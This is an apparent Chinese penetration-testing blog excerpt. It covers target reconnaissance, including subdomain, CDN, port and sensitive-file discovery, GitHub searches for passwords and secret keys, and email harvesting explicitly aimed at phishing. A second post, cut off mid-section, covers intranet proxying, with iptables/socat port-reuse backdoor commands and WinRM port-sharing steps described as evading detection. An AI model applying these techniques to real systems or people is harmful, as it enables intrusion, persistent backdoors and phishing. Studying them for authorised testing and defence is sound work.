                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20231013104711595.png"
                      alt="image-20231013104711595" style="zoom:80%;" 
                >

<h3 id="未备案域名查询"><a href="#未备案域名查询" class="headerlink" title="未备案域名查询"></a>未备案域名查询</h3><h4 id="导航页站点"><a href="#导航页站点" class="headerlink" title="导航页站点"></a>导航页站点</h4><p>可以通过一些网站获取，一些网站导航页面可能会包含一些未备案的站点</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230803145913379.png"
                      alt="image-20230803145913379" style="zoom: 67%;" 
                >

<h4 id="证书关键字"><a href="#证书关键字" class="headerlink" title="证书关键字"></a>证书关键字</h4><p>也可以通过一些证书的关键字查询，可以查询到许多信息</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230803145732403.png"
                      alt="image-20230803145732403"
                ></p>
<h3 id="DNS共享记录查询"><a href="#DNS共享记录查询" class="headerlink" title="DNS共享记录查询"></a>DNS共享记录查询</h3><p>多用于自建的DNS 服务器，是可以通过查询共享DNS服务器的主机来获取到域名。</p>
<p>如果是公开的DNS服务器，那这个查询的效果将会聊胜于无（因为它所解析的域名记录数据是十分庞大的）</p>
<p>域名解析过程：域名—&gt;DNS服务器解析—&gt;IP地址—&gt;资源访问</p>
<h4 id="查询是否存在自建DNS服务器"><a href="#查询是否存在自建DNS服务器" class="headerlink" title="查询是否存在自建DNS服务器"></a>查询是否存在自建DNS服务器</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">nslookup -query=ns baidu.com 8.8.8.8</span><br><span class="line">#指定8.8.8.8服务器来查询，就不会直接调用缓存记录</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230803150750173.png"
                      alt="image-20230803150750173"
                ></p>
<p>然后用这些查询到的DNS服务器到下面这个网站来查询一些解析过的域名</p>
<p><a class="link"   href="https://hackertarget.com/find-shared-dns-servers/" >https://hackertarget.com/find-shared-dns-servers/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230803151033878.png"
                      alt="image-20230803151033878"
                ></p>
<h3 id="子域名收集"><a href="#子域名收集" class="headerlink" title="子域名收集"></a>子域名收集</h3><h4 id="子域名查询"><a href="#子域名查询" class="headerlink" title="子域名查询"></a>子域名查询</h4><p>Google黑语法：site:baidu.com   inurl:edu.cn等等</p>
<p>比如这样就能查询baidu的一些子域名信息了</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20231013103414527.png"
                      alt="image-20231013103414527"
                ></p>
<p>网络空间搜索引擎：fofa、鹰图等</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230803214816952.png"
                      alt="image-20230803214816952"
                ></p>
<p>DNS解析历史数据（可导出：免费！）：<a class="link"   href="https://rapiddns.io/" >https://rapiddns.io/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> </p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230803151727225.png"
                      alt="image-20230803151727225"
                ></p>
<p>securitytrails：<a class="link"   href="https://securitytrails.com/" >https://securitytrails.com/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h4 id="子域名爆破"><a href="#子域名爆破" class="headerlink" title="子域名爆破"></a>子域名爆破</h4><p>原理就是利用一个字典库进行子域名拼接，然后访问列举出具有响应的域名信息</p>
<p>在线爆破：<a class="link"   href="https://phpinfo.me/domain" >https://phpinfo.me/domain <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>离线爆破：layer子域名挖掘机、subDomainsBrute、Oneforall</p>
<h3 id="同靶标单位的其他域名"><a href="#同靶标单位的其他域名" class="headerlink" title="同靶标单位的其他域名"></a>同靶标单位的其他域名</h3><p>在子域名查询之后也可以查询一些同靶单位的其他域名</p>
<h4 id="查询工具"><a href="#查询工具" class="headerlink" title="查询工具"></a>查询工具</h4><p>天眼查</p>
<p>小蓝本：可以查询到该企业的其他资产</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230803215632042.png"
                      alt="image-20230803215632042" style="zoom:67%;" 
                >

<p>零零信安</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230803220208516.png"
                      alt="image-20230803220208516" style="zoom: 67%;" 
                >

<p>工信部备案查询</p>
<p>爱企查</p>
<p>企查查</p>
<p>等</p>
<h3 id="IP反查域名"><a href="#IP反查域名" class="headerlink" title="IP反查域名"></a>IP反查域名</h3><p>通过IP来查询绑定过的域名信息来推断靶标企业的名称等信息</p>
<h4 id="工具-1"><a href="#工具-1" class="headerlink" title="工具"></a>工具</h4><p>webscan.cc</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230803152659431.png"
                      alt="image-20230803152659431" style="zoom:67%;" 
                >

<p>ip138.com</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230803220429509.png"
                      alt="image-20230803220429509" style="zoom:67%;" 
                >

<p>DNSlytics</p>
<p>fofa等</p>
<h3 id="绕过CDN查找真实IP"><a href="#绕过CDN查找真实IP" class="headerlink" title="绕过CDN查找真实IP"></a>绕过CDN查找真实IP</h3><p>CDN：出现是为了能够在较大的地理范围内提供较好的服务质量，同时也隐藏了该服务器的真实IP，提高系统安全性</p>
<h4 id="判断CDN"><a href="#判断CDN" class="headerlink" title="判断CDN"></a>判断CDN</h4><p>多地ping：站长之家</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230803153320547.png"
                      alt="image-20230803153320547" style="zoom:67%;" 
                >

<p>nslookup：如果出现多个IP则存在CDN</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230803153356076.png"
                      alt="image-20230803153356076"
                ></p>
<p>header头信息：会存在CDN 标识</p>
<p>检测工具（不太准确）</p>
<h4 id="获取真实IP"><a href="#获取真实IP" class="headerlink" title="获取真实IP"></a>获取真实IP</h4><p>DNS历史绑定记录：查询早期的DNS解析记录，因为早期的站点可能没有架设CDN，所以会暴露真实IP</p>
<p>网络空间测绘搜索引擎：domain   title   logo   body语句来查询</p>
<p>邮件头信息：邮件服务器发送的信息一般是真实IP（第三方邮件接口服务就查不到了，如腾讯、网易等）</p>
<p>子域名：某些企业对一些主站会比较上心，对于一些旁站会比较容易忽视没有配置CDN，所以可以去找找子域名，以此来找真实IP</p>
<p>异地ping：对于国内的厂商他一般可能只会对国内进行CDN加速，利用国外异地的ping服务器可能会回复真实IP</p>
<p>流量攻击：耗尽CDN 的流量，不建议</p>
<h3 id="C段扫描"><a href="#C段扫描" class="headerlink" title="C段扫描"></a>C段扫描</h3><p>确定靶标单位所使用的IP端地址，可以去查看C端的站点（误报较高）</p>
<h4 id="工具-2"><a href="#工具-2" class="headerlink" title="工具"></a>工具</h4><p>fofa</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230803154744432.png"
                      alt="image-20230803154744432"
                ></p>
<p>鹰图</p>
<p>goby</p>
<p>masscan   x.x.x.x&#x2F;24</p>
<h3 id="端口"><a href="#端口" class="headerlink" title="端口"></a>端口</h3><h4 id="端口收集"><a href="#端口收集" class="headerlink" title="端口收集"></a>端口收集</h4><p>namp</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230803155417292.png"
                      alt="image-20230803155417292"
                ></p>
<p>zmap</p>
<p>masscan（快）</p>
<p>御剑端口扫描</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230803220711942.png"
                      alt="image-20230803220711942" style="zoom:80%;" 
                >

<h3 id="公众号、小程序"><a href="#公众号、小程序" class="headerlink" title="公众号、小程序"></a>公众号、小程序</h3><p>微信、支付宝的搜索靶标相关的服务即可</p>
<p>也可以通过一些天眼查、企查查、爱企查、小蓝本（推荐）等平台查询</p>
<h3 id="APP"><a href="#APP" class="headerlink" title="APP"></a>APP</h3><p>有些资产可能会只存在于APP中</p>
<p>也是天眼查、企查查、小蓝本（推荐）</p>
<p>分析工具：点点数据、七麦数据、豌豆荚（历史版本）</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230803221119692.png"
                      alt="image-20230803221119692" style="zoom: 67%;" 
                >

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230803221232666.png"
                      alt="image-20230803221232666" style="zoom:67%;" 
                >

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230803221030937.png"
                      alt="image-20230803221030937" style="zoom: 80%;" 
                >



<h2 id="敏感信息收集"><a href="#敏感信息收集" class="headerlink" title="敏感信息收集"></a>敏感信息收集</h2><h3 id="目录结构以及敏感文件"><a href="#目录结构以及敏感文件" class="headerlink" title="目录结构以及敏感文件"></a>目录结构以及敏感文件</h3><p>常见的一些敏感目录和文件是许多时候的突破点，可以通过一些扫描工具来实现</p>
<h4 id="常见的敏感目录以及文件"><a href="#常见的敏感目录以及文件" class="headerlink" title="常见的敏感目录以及文件"></a>常见的敏感目录以及文件</h4><p>备份文件：<a class="link"   href="http://www.zip、www.rar、blog.gm7.org.zip(可以下载然后代码审计)/" >www.zip、www.rar、blog.gm7.org.zip（可以下载然后代码审计） <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>代码仓库：.git、.svn等（仓库地址拿到源码，代码审计）</p>
<p>敏感、隐藏的api接口：&#x2F;swagger-ui.html、&#x2F;env等</p>
<p>站点配置文件：croossdomain.xml、sitemap.xml、security.txt等</p>
<p>robots文件：robots.txt</p>
<p>网站的后台管理页面：admin 、adminlogin等后台管理页面会暴露在公网上，可以利用dirsearch进行子目录扫描</p>
<p>文件上传&#x2F;下载页面：upload&#x2F;    uploadfile&#x2F;    download&#x2F;等</p>
<h3 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h3><p>dirsearch</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230803221552757.png"
                      alt="image-20230803221552757"
                ></p>
<p>dirbuser</p>
<p>御剑</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230803221423844.png"
                      alt="image-20230803221423844" style="zoom:67%;" 
                >

<p>字典要全，这是很重要的！！</p>
<h4 id="常用字典"><a href="#常用字典" class="headerlink" title="常用字典"></a>常用字典</h4><p><a class="link"   href="https://github.com/insightglacier/Dictionary-Of-Pentesting" >https://github.com/insightglacier/Dictionary-Of-Pentesting <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://github.com/TheKingOfDuck/fuzzDicts" >https://github.com/TheKingOfDuck/fuzzDicts <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://github.com/rootphantomer/Blasting_dictonary" >https://github.com/rootphantomer/Blasting_dictonary <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h3 id="Google-Hacking语法"><a href="#Google-Hacking语法" class="headerlink" title="Google Hacking语法"></a>Google Hacking语法</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">inurl：用于搜索网页上包含的URL</span><br><span class="line">intext：只搜索网页部分中包含的文字</span><br><span class="line">site：可以限制你搜索范围的域名</span><br><span class="line">filetype：搜索文件的后缀或者扩展名</span><br><span class="line">intitle：限制你搜索的网页标题</span><br></pre></td></tr></table></figure></div>

<p>下面这些很少用到</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">allintext：可同时查找多个单词的正文页面</span><br><span class="line">allintitle：可同时查找多个单词的标题页面</span><br><span class="line">allinurl：可同时查找多个单词的URL页面</span><br></pre></td></tr></table></figure></div>

<h3 id="JS信息收集"><a href="#JS信息收集" class="headerlink" title="JS信息收集"></a>JS信息收集</h3><p>js文件一般用于帮助网站执行一些功能，存储着客户端的代码，可能会存在大量的敏感信息</p>
<h4 id="JS手工查找"><a href="#JS手工查找" class="headerlink" title="JS手工查找"></a>JS手工查找</h4><p>通过网页源代码来查询，一般会有大量的js文件，多数还有混淆信息，可以利用搜索来实现快速查找</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230803163229038.png"
                      alt="image-20230803163229038" style="zoom:67%;" 
                >

<h4 id="JS工具爬取"><a href="#JS工具爬取" class="headerlink" title="JS工具爬取"></a>JS工具爬取</h4><h5 id="URLFinder"><a href="#URLFinder" class="headerlink" title="URLFinder"></a>URLFinder</h5><p>指定URL进行扫描，可以收集url，js文件的地址并且判断状态码</p>
<h5 id="FindSomething浏览器插件"><a href="#FindSomething浏览器插件" class="headerlink" title="FindSomething浏览器插件"></a>FindSomething浏览器插件</h5><p>使用比较方便，点击即可，可以收集path、url、敏感信息等</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230803163433749.png"
                      alt="image-20230803163433749" style="zoom:80%;" 
                >

<h3 id="指纹识别"><a href="#指纹识别" class="headerlink" title="指纹识别"></a>指纹识别</h3><p>Finger：<a class="link"   href="https://github.com/EASY233/Finger" >https://github.com/EASY233/Finger <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230804093637361.png"
                      alt="image-20230804093637361"
                ></p>
<p>Wappalyzer</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230803163604433.png"
                      alt="image-20230803163604433"
                ></p>
<h3 id="GIT仓库搜索"><a href="#GIT仓库搜索" class="headerlink" title="GIT仓库搜索"></a>GIT仓库搜索</h3><h4 id="GitHub搜索语法"><a href="#GitHub搜索语法" class="headerlink" title="GitHub搜索语法"></a>GitHub搜索语法</h4><p>高级搜索：<a class="link"   href="https://github.com/search/advanced" >https://github.com/search/advanced <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230803221923376.png"
                      alt="image-20230803221923376"
                ></p>
<p>搜索语法：<a class="link"   href="https://docs.github.com/cn/search-github" >https://docs.github.com/cn/search-github <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>常见的搜索语法：<a class="link"   href="https://github.com/obheda12/GitDorker/tree/master/Dorks" >https://github.com/obheda12/GitDorker/tree/master/Dorks <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h4 id="搜索关键字例子"><a href="#搜索关键字例子" class="headerlink" title="搜索关键字例子"></a>搜索关键字例子</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">password    pwd</span><br><span class="line">access_key  secret_key  token  secret  api_key</span><br><span class="line">extention:/properties   extention:.config  extension:.env</span><br><span class="line">filename:jdbc           filename:config.ini</span><br></pre></td></tr></table></figure></div>

<h4 id="其他仓库"><a href="#其他仓库" class="headerlink" title="其他仓库"></a>其他仓库</h4><p>gitee：<a class="link"   href="https://gitee.com/" >https://gitee.com/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>csdn：<a class="link"   href="https://gitcode.net/explore" >https://gitcode.net/explore <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h3 id="网盘信息收集"><a href="#网盘信息收集" class="headerlink" title="网盘信息收集"></a>网盘信息收集</h3><p>由于一些人员的安全意识较为薄弱，会将一些敏感信息比如项目代码、密码等信息上传网盘中去，并且没有对资源做加密处理，就会被一些云盘爬虫爬取，导致敏感信息泄露</p>
<h4 id="在线平台"><a href="#在线平台" class="headerlink" title="在线平台"></a>在线平台</h4><p>懒盘搜索：<a class="link"   href="https://lzpan.com/" >https://lzpan.com/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>凌风云：<a class="link"   href="https://www.lingfengyun.com/" >https://www.lingfengyun.com/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>蓝菊花：<a class="link"   href="http://www.lanjuhua.con/" >http://www.lanjuhua.con <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>大力盘：<a class="link"   href="https://www.dalipan.com/" >https://www.dalipan.com/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20231013102830999.png"
                      alt="image-20231013102830999"
                ></p>
<h3 id="邮箱收集"><a href="#邮箱收集" class="headerlink" title="邮箱收集"></a>邮箱收集</h3><p>目的：邮箱收集是为了筛选安全意识低的员工，做社工、钓鱼</p>
<p>收集靶标单位散布在互联网中的员工邮箱地址或者功能性邮箱（HR邮箱、投诉邮箱、技术支持邮箱）</p>
<h4 id="收集方法"><a href="#收集方法" class="headerlink" title="收集方法"></a>收集方法</h4><h5 id="Google-Hacking"><a href="#Google-Hacking" class="headerlink" title="Google Hacking"></a>Google Hacking</h5><p>intext：@qq.com filetype:xlsx</p>
<h5 id="零零信安"><a href="#零零信安" class="headerlink" title="零零信安"></a>零零信安</h5><p>高级查询：email&#x3D;&#x3D;@126.com</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230803222558925.png"
                      alt="image-20230803222558925"
                ></p>
<h5 id="snov-io"><a href="#snov-io" class="headerlink" title="snov.io"></a>snov.io</h5><p>在线搜索</p>
<h5 id="phonebook-cz"><a href="#phonebook-cz" class="headerlink" title="phonebook.cz"></a>phonebook.cz</h5><p>可支持域名搜索，根据域名信息来收集一些邮箱</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230803222653071.png"
                      alt="image-20230803222653071"
                ></p>
<h5 id="hunter-io（25条-x2F-月）"><a href="#hunter-io（25条-x2F-月）" class="headerlink" title="hunter.io（25条&#x2F;月）"></a>hunter.io（25条&#x2F;月）</h5><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230803222754023.png"
                      alt="image-20230803222754023"
                ></p>
<h5 id="天眼查"><a href="#天眼查" class="headerlink" title="天眼查"></a>天眼查</h5><h5 id="百度寻客宝（爱企查）"><a href="#百度寻客宝（爱企查）" class="headerlink" title="百度寻客宝（爱企查）"></a>百度寻客宝（爱企查）</h5><p>搜索企业名，可以获取到该企业的一些内部人员的联系方式</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20231013102158707.png"
                      alt="image-20231013102158707"
                ></p>
]]></content>
  </entry>
  <entry>
    <title>内网代理与转发</title>
    <url>/2024/02/29/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E4%B8%8E%E8%BD%AC%E5%8F%91/</url>
    <content><![CDATA[<h1 id="内网代理与转发"><a href="#内网代理与转发" class="headerlink" title="内网代理与转发"></a>内网代理与转发</h1><h2 id="内网代理转发概述"><a href="#内网代理转发概述" class="headerlink" title="内网代理转发概述"></a>内网代理转发概述</h2><p>在渗透测试中，为了去发现内网资产的脆弱性，暴露更大的攻击面，往往是需要搭建代理通道，在外网实现对内网系统的访问</p>
<p>进入内网之后，为了突破内网网络边界隔离，一般需要搭建多层代理，实现从DMZ等入口边界网络向生产网、核心网、办公网等靶标所在网络的跨越</p>
<p>在多层网络隔离的情况下，为了实现对更深层次网络的访问，往往需要在最深处搭建代理，结合端口转发实现网络跨越</p>
<p>网络环境中只允许指定端口出网的时候，为了实现边界突破，需要进行端口复用，实现对防火墙的跨越</p>
<h3 id="正向代理"><a href="#正向代理" class="headerlink" title="正向代理"></a>正向代理</h3><p>客户端——–&gt;代理节点——–&gt;服务器</p>
<p>正向代理，主要的原理是客户端为了从服务器中取得内容，向代理服务器发送一个请求并指定目标服务器，然后代理服务器转交请求，并将内容返回客户端</p>
<h4 id="正向隧道"><a href="#正向隧道" class="headerlink" title="正向隧道"></a>正向隧道</h4><p>攻击机—-（监听端口）—-&gt;被控主机（开启的端口）——–&gt;访问被控网络</p>
<h3 id="反向代理"><a href="#反向代理" class="headerlink" title="反向代理"></a>反向代理</h3><p>攻击机&lt;—-代理服务器&lt;—-服务器</p>
<p>服务器根据客户端的请求，获取资源后通过代理服务器将资源返回给客户端，客户端只会知道代理服务器的IP地址</p>
<h4 id="反向隧道"><a href="#反向隧道" class="headerlink" title="反向隧道"></a>反向隧道</h4><p>被控网络&lt;—&gt;被控主机—&gt;自己vps服务器—&gt;攻击机</p>
<h3 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h3><p>客户端—-&gt;端口A&lt;—-&gt;端口B</p>
<p>通过一一系列的配置或者软件，将访问端口A的流量转发到端口B上</p>
<p>端口A\B可以是本地端口也可以是远程端口</p>
<p>端口A\B可以是同一主机也可以是在不同主机</p>
<h3 id="端口复用"><a href="#端口复用" class="headerlink" title="端口复用"></a>端口复用</h3><p>用户A—-&gt;端口B—-防火墙—-&gt;端口A—-&gt;程序C—-&gt;程序A和程序B</p>
<p>不同的应用程序使用相同端口进行通讯</p>
<p>端口复用在系统已经开放的端口上进行通讯，只对输入的信息进行字符匹配，不对网络数据进行任何拦截、复制类操作，所以对网络数据的传输性能丝毫不受影响，但会会影响业务，实战应用很少</p>
<p>端口复用可以更好的隐藏攻击行为，有时也用作通道后门</p>
<h4 id="Linux端口复用"><a href="#Linux端口复用" class="headerlink" title="Linux端口复用"></a>Linux端口复用</h4><p>使用iptables进行端口复用</p>
<p>新建端口复用链</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">iptables -t nat -N PUBLIC_ALLOW</span><br></pre></td></tr></table></figure></div>

<p>端口复用规则</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">iptables -t nat -As PUBLIC_ALLOW -p tcp -j REDIRECT --to-port【目标端口】</span><br></pre></td></tr></table></figure></div>

<p>开启端口复用开关</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">iptables -I INPUT -p tcp -m string --string &#x27;kaikaikai&#x27; --algo bm -m recent --name public_allow --remove -j ACCEPT</span><br></pre></td></tr></table></figure></div>

<p>设置时效性</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">iptables -t nat -A PREROUTING -p tcp --dport 80 --syn -m recent --rcheck --seconds 3600 --name public_allow --rsource -j PUBLIC_ALLOW</span><br></pre></td></tr></table></figure></div>

<p>使用socat发送约定口令至目标主机打开端口复用开关</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo kaikaikai | socat - tcp:【目标服务器】:80</span><br></pre></td></tr></table></figure></div>

<p>使用完毕之后，发送约定关闭口令至目标主机目标端口关闭端口复用</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo kaikaikai | socat - tcp:【目标服务器】:80</span><br></pre></td></tr></table></figure></div>

<p>注意：使用该方法开启的端口复用是有限复用，正常的业务会受影响，仅用于后门留存，或者临时使用，不建议长期使用</p>
<h4 id="Windows端口复用"><a href="#Windows端口复用" class="headerlink" title="Windows端口复用"></a>Windows端口复用</h4><h5 id="HTTPS-sys端口复用"><a href="#HTTPS-sys端口复用" class="headerlink" title="HTTPS.sys端口复用"></a>HTTPS.sys端口复用</h5><p>在IIS6.0之后微软HTTPS.sys原生提供端口复用的功能</p>
<p>只要注册不用的前缀即可使用</p>
<p>WinRM（微软远程管理服务）就是在HTTPS.sys上注册了wsman的URL前缀，默认监听端口5985</p>
<p>查询当前注册URL前缀</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">netsh  http show servicestate</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230808202120080.png"
                      alt="image-20230808202120080"
                ></p>
<p>开启WinRM服务</p>
<p>在开启Windows2012以上的服务操作系统种，WinRM服务默认启动并且监听了5985端口</p>
<p>对于Windows2008，则需要使用以下命令来启动WinRM服务</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">winrm quickconfig -q</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230808202137316.png"
                      alt="image-20230808202137316"
                ></p>
<p>增加80端口复用</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">winrm set winrm/config/service @&#123;EnableCompatibilityHttpListener=&quot;true&quot;&#125;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230808202158661.png"
                      alt="image-20230808202158661"
                ></p>
<p>此时80和5985均处在开启状态</p>
<p>更改WinRM端口</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">winrm set winrm/config/Listener?Address=*+Transport=HTTP @&#123;Port=&quot;80&quot;&#125;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230808202219814.png"
                      alt="image-20230808202219814"
                ></p>
<p>在5985默认不开启的情况下执行此命令，否则容易被发现</p>
<p>如果默认开启5985，仅做上一步即可</p>
<p>查看是否已经增加80端口的WRM前缀</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">netsh  http show servicestate</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230808202306092.png"
                      alt="image-20230808202306092"
                ></p>
<h3 id="代理客户端工具"><a href="#代理客户端工具" class="headerlink" title="代理客户端工具"></a>代理客户端工具</h3><p>Proxifier</p>
<h3 id="浏览器代理工具"><a href="#浏览器代理工具" class="headerlink" title="浏览器代理工具"></a>浏览器代理工具</h3><p>Proxy SwitchOmega</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230807111526311.png"
                      alt="image-20230807111526311"
                ></p>
<h2 id="代理协议以及工具"><a href="#代理协议以及工具" class="headerlink" title="代理协议以及工具"></a>代理协议以及工具</h2><h3 id="常见的代理技术"><a href="#常见的代理技术" class="headerlink" title="常见的代理技术"></a>常见的代理技术</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">TCP：Socks4（a）---工具CS、pystinger    Socks5---SSH、FRP、NPS、iox</span><br><span class="line">UDP：KCP---Dtunnel、UDPtunnel     DNS---DNS2TCP、DNSCAT</span><br><span class="line">ICMP：工具pingtunnel、icmpsh</span><br></pre></td></tr></table></figure></div>

<h3 id="Socks4a"><a href="#Socks4a" class="headerlink" title="Socks4a"></a>Socks4a</h3><h4 id="CS上线"><a href="#CS上线" class="headerlink" title="CS上线"></a>CS上线</h4><p>内网渗透利器，团队协作平台</p>
<p>可以进行水坑、鱼叉攻击</p>
<p>具有高度可扩展的框架</p>
<p>通过一些手段获取到这台主机权限之后，发现内网环境中还有一台主机只能由这个已上线的主机访问</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230808213358335.png"
                      alt="image-20230808213358335"
                ></p>
<p>在已上线的主机上设置socks代理端口为9071</p>
<p><img  
